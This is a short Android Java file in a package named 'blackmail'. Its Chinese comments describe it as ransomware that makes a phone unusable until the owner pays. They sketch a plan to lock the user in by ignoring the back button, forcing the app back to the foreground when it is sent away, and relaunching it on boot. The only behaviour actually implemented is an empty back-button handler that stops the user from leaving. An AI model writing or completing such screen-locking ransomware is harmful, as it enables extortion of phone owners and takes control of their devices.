package com.example.agoodob.blackmail;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

/**
 * 2016-2-28
 *
 * 勒索软件就是让你的手机无法使用，必须转一笔钱才能使用
 *
 *
 * 后退按钮直接不处理, 就行了
 * Home 按键无法处理，那么就一检测到后台, 自动打开到前台，
 * 关机/重启 的话就监听开机事件
 */
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    public void onBackPressed() {
        // 这个是后退键
        // 这样就无法退出了
    }
}
